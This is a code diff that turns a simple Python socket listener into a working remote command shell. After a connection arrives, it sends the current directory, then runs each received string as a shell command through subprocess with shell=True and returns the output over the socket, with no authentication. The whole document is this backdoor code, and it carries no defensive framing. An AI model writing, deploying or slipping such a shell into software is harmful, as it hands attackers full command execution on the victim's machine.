@@ -1,5 +1,7 @@
 import socket
 import sys
+import subprocess
+import os
 
 #create a socket
 def create_socket():
@@ -34,5 +36,31 @@ def bind_socket():
 def accept_connection():
     connection, address = s.accept()
     print("Connection has been established! | " + "IP " + address[0] + " | Port " + str(address[1]))
+    currentWD = os.getcwd() + "> "
+    connection.send(str.encode( currentWD))
     #do something with the connection
+    execute_commands(connection)
     connection.close()
+
+#execute commands sent by the server
+def execute_commands(connection):
+    while(True):
+        data = connection.recv(1024)
+        if data[:2].decode("utf-8") == 'cd':
+            os.chdir(data[3:].decode("utf-8"))
+
+        if len(data) > 0:
+            cmd = subprocess.Popen(data[:].decode("utf-8"),shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
+            output_byte = cmd.stdout.read() + cmd.stderr.read() # output and error messages
+            output_str = str(output_byte,"utf-8")
+            currentWD = os.getcwd() + "> " 
+            connection.send(str.encode( currentWD + output_str ))
+            print(output_str)
+
+def main():
+    create_socket()
+    bind_socket()
+    accept_connection()
+
+
+main()
